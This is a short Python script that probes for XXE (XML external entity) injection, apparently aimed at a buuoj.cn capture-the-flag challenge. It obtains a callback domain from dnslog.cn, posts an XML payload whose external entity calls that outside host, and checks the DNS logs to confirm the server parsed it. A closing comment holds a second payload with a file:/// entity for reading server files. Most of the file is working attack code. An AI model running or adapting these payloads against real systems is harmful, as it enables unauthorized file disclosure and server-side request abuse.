"""
Author:Beacon
File:xxe_detect
Date:2022/5/18
"""
import requests


def getDomain():
    # return a random domain and a cookie
    # cookie is used to get records
    print("[+]Trying to connect to www.dnslog.cn...")
    url = "http://www.dnslog.cn:80/getdomain.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        "Accept": "*/*", "Referer": "http://www.dnslog.cn/", "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    r = requests.get(url, headers=headers)
    cookie = r.cookies
    domain = str(r.text)
    print("[+]Get random domain:" + domain)
    return domain, cookie


def getRecords(domain, cookie):
    # get records
    # verify that the request was received
    print("[+]Querying the return value...")
    url = "http://www.dnslog.cn:80/getrecords.php"
    cookies = cookie
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        "Accept": "*/*", "Referer": "http://www.dnslog.cn/", "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    try:
        r = requests.get(url, headers=headers, cookies=cookies)
        # print(r.text)
        if domain in r.text:
            print("[+]XXE:Get it!")
        else:
            print("[+]Null!")
    except Exception as e:
        print("[!]The query fails!")
        print("[!]Something Wrong:", e)


def connectTest(domain):
    url = "http://" + domain
    # get(url=url) is a bad requests
    # because the url do not exist
    # so use try ... except ...
    try:
        requests.get(url=url)
    except:
        print("[+]Try to connect to " + url)


def postXml(url, domain):
    # post xml
    # test whether xml can execute
    print("[+]Check whether communication can be performed...")
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close",
               "Content-Type": "application/x-www-form-urlencoded"}
    data = f"<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<!DOCTYPE xxe [\r\n<!ELEMENT name ANY >\r\n<!ENTITY xxe SYSTEM \"http://{domain}\" >]>\r\n<root>\r\n<name>&xxe;</name>\r\n</root>"
    requests.post(url=url, headers=headers, data=data)


url = "http://adc5caab-c8d3-4712-8bdc-264144bf65fd.node4.buuoj.cn:81/doLogin.php"
domain, cookie = getDomain()
# connectTest(domain)
postXml(url, domain)
getRecords(domain, cookie)

"""
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///" >]>
<root>
<name>&xxe;</name>
</root> 
"""
